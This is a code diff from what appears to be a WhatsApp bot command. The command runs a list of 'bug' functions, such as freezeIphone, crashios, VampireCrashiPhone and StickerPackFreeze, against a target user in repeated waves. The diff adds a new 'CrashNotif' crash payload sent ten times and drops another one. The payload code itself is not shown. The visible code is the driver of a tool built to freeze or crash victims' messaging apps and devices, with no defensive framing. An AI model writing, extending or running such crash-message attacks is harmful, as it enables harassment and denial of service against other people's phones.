@@ -60,7 +60,7 @@ export default {
   iosinVisFC, NewProtocolbug6, VtxForceDelMsg2, SnitchDelayVolteX,
   freezeIphone, BlankVisco, PhotoDelay, IosInvisible, ContactXIos, StickerPackFreeze,
   VampireCrashiPhone, crashios, crashios3, protocolbug6, FlowXNull,
-  forceClick, XheavensdeeP, SqhForce, FreezePackk, SqhForceCombo
+  forceClick, XheavensdeeP, SqhForce, FreezePackk, CrashNotif
 } = await import("../../lib/buggers/bug.js")
 
       let progressMsg = await sock.sendMessage(m.chat, { 
@@ -74,6 +74,7 @@ export default {
       const bugs = [
         {name: 'StickerPackFreeze', fn: () => StickerPackFreeze(sock, target), count: 5 },
         { name: 'IosinVisFC', fn: () => iosinVisFC(sock, target), count: 5 },
+        { name: 'CrashNotif', fn: () => CrashNotif(sock, target ), count: 10 },
         { name: 'NewProtocol6', fn: () => NewProtocolbug6(sock, target), count: 5 },
         { name: 'VtxForceDel', fn: () => VtxForceDelMsg2(sock, target), count: 5 },
         { name: 'SnitchDelay', fn: () => SnitchDelayVolteX(sock, target), count: 5 },
@@ -90,8 +91,7 @@ export default {
         { name: 'ForceClick', fn: () => forceClick(sock, target), count: 5 },
         { name: 'XheavensdeeP', fn: () => XheavensdeeP(sock, target), count: 5 },
         { name: 'SqhForce', fn: () => SqhForce(sock, target), count: 5 },
-        { name: 'FreezePack', fn: () => FreezePackk(sock, target), count: 5 },
-        { name: 'SqhForceCombo', fn: () => SqhForceCombo(sock, target), count: 4 }
+        { name: 'FreezePack', fn: () => FreezePackk(sock, target), count: 5 }
       ]
 
       let totalWaves = 0
